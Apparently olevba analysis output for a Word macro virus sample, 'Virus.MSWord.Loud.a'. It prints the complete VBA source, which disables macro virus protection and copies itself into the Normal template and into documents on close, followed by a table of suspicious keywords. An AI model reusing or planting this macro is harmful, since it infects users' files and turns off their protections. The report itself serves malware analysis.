olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Loud.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Loud.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'1nternal
On Error GoTo Break
Set A = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set N = NormalTemplate.VBProject.VBComponents(1).CodeModule
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If N.Lines(2, 1) = "'1nternal" Then GoTo CheckA
For I = 1 To 19
N.InsertLines I, A.Lines(I, 1)
Next I
CheckA:
If A.Lines(2, 1) = "'1nternal" Then GoTo Break
For I = 1 To 19
A.InsertLines I, N.Lines(I, 1)
Next I
Break:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

